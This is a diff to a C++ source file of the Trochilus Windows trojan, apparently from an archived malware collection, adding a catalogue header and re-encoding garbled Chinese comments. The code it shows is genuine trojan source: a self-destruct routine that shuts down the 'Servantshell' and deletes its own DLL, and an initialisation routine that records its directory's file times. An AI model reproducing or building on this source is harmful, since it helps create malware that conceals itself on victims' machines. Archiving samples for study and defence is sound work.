@@ -1,3 +1,14 @@
+/*
+  name      Trochilus
+  type      trojan
+  cve       â€”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    RamadhanAmizudin/malware
+  archived  RamadhanAmizudin, krisyotam (2026)
+  notes     â€”
+ */
 #include "stdafx.h"
 #include "destruction/SelfDestruction.h"
 #include "file/MyFile.h"
@@ -27,7 +38,7 @@ SHELL_API BOOL XFC( const LPVOID lpPlain, DWORD dwPlainLen, LPVOID lpEncrypted, 
 
 SHELL_API void SD()
 {
-	//Í£Ö¹Servantshell¹¤×÷
+	//Í£Ö¹Servantshellï¿½ï¿½ï¿½ï¿½
 	DeinitServantShell();
 /*	SelfDestruction::DeleteRunItem();*/
 	SelfDestruction::ExitAndDeleteSelfDll(g_hServantshell);
@@ -105,7 +116,7 @@ SHELL_API void CheckDT()
 
 SHELL_API void Init( BOOL isIns /*= TRUE*/ )
 {
-	//»ñÈ¡ËùÔÚÄ¿Â¼µÄÊ±¼ä
+	//ï¿½ï¿½È¡ï¿½ï¿½ï¿½ï¿½Ä¿Â¼ï¿½ï¿½Ê±ï¿½ï¿½
 	g_locationDir = GetBinFilepath();
 	if (g_locationDir.back() == '\\') g_locationDir.erase(g_locationDir.size() - 1);
 	GetFileTimes(g_locationDir.c_str(), TRUE, TIMES_PARAM(g_ftLocationDir));
